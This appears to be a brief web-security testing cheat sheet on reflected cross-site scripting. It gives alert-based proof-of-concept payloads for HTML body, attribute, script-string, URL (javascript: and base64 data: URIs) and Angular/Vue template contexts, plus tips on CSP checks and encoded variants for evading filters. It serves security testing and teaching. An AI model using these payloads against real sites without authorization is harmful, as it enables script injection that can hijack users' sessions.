## Reflected XSS

<div style={styles.lead}>
      <strong>First Step:</strong> The very first step is to find any field
      where you can input any value and then to check where it is being
      reflected in the response, whether it is modified or unmodified.
</div>

For Reflected XSS, you will generally find the input in HTML body, HTML attribute, script tag and URL.

### If it is in HTML body

We test with tag injection:

```html
<img src=test onerror=alert>
```

### If it is in HTML attribute

We escape using quotes `"`:

```html
"onmouseover=alert(1)"
```

### If it is in script tag or a JavaScript string literal

We use string literal closure:

```javascript
';alert(1);//
```

### If it is in URL

We use `javascript:` or `data:` protocol injection:

```javascript
javascript:alert(1)
```

Other examples / variants:

```text
data:[MIME type][;charset][;base64],<data>
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg== (base64 encoded)
data:text/html,<script>alert(1)</script>
```

### If it is in the Template expression (Angular/Vue)

We use template expression syntax:

```javascript
{{constructor.constructor('alert(1)')()}}
```

## Additional Checks & Variations

* We also check for Content Security Policy (unsafe-inline, unsafe-eval or overly permissive domains).

* Also test your payload via URL encoding, HTML encoding and double encoding variants as well.
